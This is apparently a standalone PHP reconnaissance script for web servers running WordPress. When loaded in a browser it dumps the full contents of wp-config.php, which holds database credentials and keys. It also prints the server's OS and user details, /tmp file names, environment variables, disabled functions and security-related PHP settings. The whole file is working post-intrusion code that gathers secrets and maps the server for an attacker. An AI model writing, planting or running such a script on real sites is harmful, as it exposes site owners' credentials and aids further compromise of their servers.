<?php
echo "=== SYSTEM INFORMATION === ";
echo "OS: " . php_uname('s') . " ";
echo "Hostname: " . php_uname('n') . " ";
echo "Release: " . php_uname('r') . " ";
echo "Version: " . php_uname('v') . " ";
echo "(" . date('Y-m-d') . ") ";
echo "Machine: " . php_uname('m') . " ";

echo "=== CURRENT USER === ";
echo "PHP User: " . get_current_user() . " ";
echo "PHP UID: " . getmyuid() . " ";
echo "PHP GID: " . getmygid() . " ";

echo "=== WORDPRESS CONFIG === ";
$wp_config_paths = [
    dirname(__FILE__) . '/wp-config.php',
    dirname(__FILE__) . '/../wp-config.php',
];

$wp_config = null;
foreach ($wp_config_paths as $path) {
    if (file_exists($path)) {
        $wp_config = $path;
        break;
    }
}

if ($wp_config) {
    echo "wp-config.php IS READABLE! ";
    echo "File Size: " . filesize($wp_config) . " bytes ";
    echo "File Permissions: " . substr(sprintf('%o', fileperms($wp_config)), -4) . " ";
    echo "Last Modified: " . date('Y-m-d H:i:s', filemtime($wp_config)) . " ";
    echo "=== wp-config.php CONTENT === ";
    echo htmlspecialchars(file_get_contents($wp_config));
} else {
    echo "wp-config.php NOT FOUND or NOT READABLE ";
}

echo "=== TEMP DIRECTORY === ";
echo "Files in /tmp: ";
$tmp_files = scandir('/tmp');
foreach ($tmp_files as $f) {
    if ($f !== '.' && $f !== '..') {
        echo "- " . $f . " ";
    }
}

echo "=== ENVIRONMENT VARIABLES (IMPORTANT) === ";
$important_env = ['USER', 'HOME', 'SERVER_NAME', 'DOCUMENT_ROOT', 'REMOTE_ADDR',
                  'SERVER_ADDR', 'SERVER_SOFTWARE', 'CONTEXT_DOCUMENT_ROOT', 'SCRIPT_FILENAME'];
foreach ($important_env as $key) {
    $val = isset($_SERVER[$key]) ? $_SERVER[$key] : getenv($key);
    if ($val) echo "$key: $val ";
}

echo "=== DISABLED FUNCTIONS === ";
echo ini_get('disable_functions') . " ";

echo "=== PHP CONFIGURATION === ";
echo "PHP Version: " . phpversion() . " ";
echo "Safe Mode: " . (ini_get('safe_mode') ? 'ON' : 'OFF') . " ";
echo "Display Errors: " . (ini_get('display_errors') ? 'ON' : 'OFF') . " ";
echo "Allow URL Fopen: " . (ini_get('allow_url_fopen') ? 'YES' : 'NO') . " ";
echo "Max File Upload: " . ini_get('upload_max_filesize') . " ";
?>
